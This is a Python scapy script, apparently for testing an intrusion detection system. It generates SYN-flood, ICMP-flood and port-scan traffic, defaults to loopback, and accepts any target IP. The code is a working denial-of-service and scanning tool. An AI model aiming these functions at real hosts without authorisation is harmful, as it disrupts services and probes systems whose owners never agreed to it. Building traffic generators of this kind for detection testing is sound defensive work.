import argparse
from scapy.all import IP, TCP, ICMP, send
import time

def syn_flood(target_ip, target_port, count, iface):
    """Simulate a SYN flood attack (DoS - neptune) with high detection confidence."""
    print(f"Sending SYN flood to {target_ip}:{target_port}...")
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
    send(packet, count=count, iface=iface, verbose=0)
    print(f"Sent {count} SYN packets.")

def icmp_flood(target_ip, count, iface):
    """Simulate an ICMP flood attack (DoS - smurf) with medium detection confidence."""
    print(f"Sending ICMP flood to {target_ip}...")
    packet = IP(dst=target_ip) / ICMP()
    send(packet, count=count, iface=iface, verbose=0)
    print(f"Sent {count} ICMP packets.")

def port_scan(target_ip, port_range, iface):
    """Simulate a port scan (Probe - nmap or portsweep) with medium detection confidence."""
    print(f"Scanning ports {port_range[0]}-{port_range[1]} on {target_ip}...")
    for port in range(port_range[0], port_range[1] + 1):
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
        send(packet, iface=iface, verbose=0)
        time.sleep(0.01)  # Small delay to avoid overwhelming the system
    print(f"Completed port scan on {target_ip}.")

def main():
    parser = argparse.ArgumentParser(description="Simulate malicious traffic to test IDS detection capabilities")
    parser.add_argument("--attack", choices=["syn", "icmp", "scan"], required=True,
                        help="Type of attack: syn (DoS - neptune), icmp (DoS - smurf), scan (Probe - nmap/portsweep)")
    parser.add_argument("--target", default="127.0.0.1",
                        help="Target IP address (default: 127.0.0.1 for loopback testing)")
    parser.add_argument("--port", type=int, default=80,
                        help="Target port for SYN flood (default: 80)")
    parser.add_argument("--count", type=int, default=100,
                        help="Number of packets to send (default: 100)")
    parser.add_argument("--iface", required=True,
                        help="Network interface to use (e.g., 'Software Loopback Interface 1')")
    parser.add_argument("--port-range", type=int, nargs=2, default=[1, 100],
                        help="Port range for scan (start end, default: 1 100)")
    args = parser.parse_args()

    if args.attack == "syn":
        syn_flood(args.target, args.port, args.count, args.iface)
    elif args.attack == "icmp":
        icmp_flood(args.target, args.count, args.iface)
    elif args.attack == "scan":
        port_scan(args.target, args.port_range, args.iface)

if __name__ == "__main__":
    main()